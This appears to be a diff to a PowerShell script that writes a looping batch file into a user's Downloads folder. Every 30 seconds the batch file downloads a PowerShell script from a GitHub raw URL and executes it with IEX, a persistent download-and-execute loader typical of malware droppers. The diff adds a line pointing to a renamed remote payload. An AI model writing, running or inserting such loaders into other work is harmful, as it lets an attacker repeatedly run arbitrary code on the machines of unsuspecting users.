@@ -1,6 +1,6 @@
 md C:\Users\User\Downloads\ser; $contentToAdd = @"
 :a
-powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd());
+powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 timeout /t 30
 goto a
 "@; add-content "C:\Users\User\Downloads\ser/seruex.bat" $contenttoadd; $contentToAdd = @"
